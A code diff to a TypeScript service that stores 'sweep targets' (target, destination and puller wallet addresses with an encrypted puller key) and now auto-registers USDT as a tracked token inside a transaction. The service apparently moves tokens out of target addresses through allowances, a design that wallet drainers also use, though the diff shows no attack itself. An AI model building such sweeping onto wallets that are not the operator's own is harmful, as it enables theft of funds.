@@ -2,6 +2,7 @@ import crypto from 'node:crypto';
 import { privateKeyToAccount } from 'viem/accounts';
 import { db, redis } from '../config/db';
 import { encrypt, decrypt } from './encryption';
+import { ENV } from '../config/env';
 
 export interface Token { id: number; token: `0x${string}`; allowanceOk: boolean }
 
@@ -25,21 +26,45 @@ export async function upsertTarget(o: {
   userId: number; target: string; destination: string;
   puller: string; pullerKey: string; instanceId?: string | null;
 }): Promise<number> {
-  const { rows } = await db.query(
-    `INSERT INTO sweep_targets
-       (user_id, target_address, destination_address, puller_address, encrypted_puller_key, baw_instance_id)
-     VALUES ($1,$2,$3,$4,$5,$6)
-     ON CONFLICT (user_id, target_address) DO UPDATE SET
-       destination_address = EXCLUDED.destination_address,
-       puller_address = EXCLUDED.puller_address,
-       encrypted_puller_key = EXCLUDED.encrypted_puller_key,
-       is_active = true
-     RETURNING id`,
-    [o.userId, o.target.toLowerCase(), o.destination.toLowerCase(),
-     o.puller.toLowerCase(), encrypt(o.pullerKey), o.instanceId ?? null],
-  );
-  await redis.del('targets:ver');
-  return rows[0].id as number;
+  const client = await db.getClient();
+  try {
+    await client.query('BEGIN');
+
+    // 1. Upsert target
+    const { rows } = await client.query(
+      `INSERT INTO sweep_targets
+         (user_id, target_address, destination_address, puller_address, encrypted_puller_key, baw_instance_id, is_active)
+       VALUES ($1,$2,$3,$4,$5,$6,true)
+       ON CONFLICT (user_id, target_address) DO UPDATE SET
+         destination_address = EXCLUDED.destination_address,
+         puller_address = EXCLUDED.puller_address,
+         encrypted_puller_key = EXCLUDED.encrypted_puller_key,
+         baw_instance_id = COALESCE(EXCLUDED.baw_instance_id, sweep_targets.baw_instance_id),
+         is_active = true
+       RETURNING id`,
+      [o.userId, o.target.toLowerCase(), o.destination.toLowerCase(),
+       o.puller.toLowerCase(), encrypt(o.pullerKey), o.instanceId ?? null],
+    );
+    
+    const targetId = rows[0].id as number;
+
+    // 2. Automatically provision USDT as a default tracked token so listener.ts scan() works instantly
+    const defaultToken = (ENV.USDT || '0x55d398326f99059ff775485246999027b3197955').toLowerCase();
+    await client.query(
+      `INSERT INTO target_tokens (target_id, token_address, allowance_ok) VALUES ($1, $2, false)
+       ON CONFLICT (target_id, token_address) DO NOTHING`,
+      [targetId, defaultToken]
+    );
+
+    await client.query('COMMIT');
+    await redis.del('targets:ver');
+    return targetId;
+  } catch (e) {
+    await client.query('ROLLBACK');
+    throw e;
+  } finally {
+    client.release();
+  }
 }
 
 export async function addToken(targetId: number, token: string) {
